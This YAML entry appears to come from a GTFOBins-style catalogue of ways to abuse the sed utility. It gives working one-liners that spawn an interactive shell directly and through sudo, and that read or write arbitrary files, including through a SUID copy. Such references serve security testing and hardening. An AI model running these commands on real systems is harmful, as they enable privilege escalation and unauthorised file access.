---
functions:
  execute-interactive:
    - code: sed "e /bin/sh -c 'exec 10<&0 11>&1 0<&2 1>&2; /bin/sh -i'"
  sudo-enabled:
    - code: sudo sed "e /bin/sh -c 'exec 10<&0 11>&1 0<&2 1>&2; /bin/sh -i'"
  suid-enabled:
    - code: |
        LFILE=file_to_read
        ./sed -e '' "$LFILE"
  file-read:
    - code: |
        LFILE=file_to_read
        sed -e '' "$LFILE"
  file-write:
    - code: |
        LFILE=file_to_write
        echo x | sed "s/x/data/;w $LFILE"
---
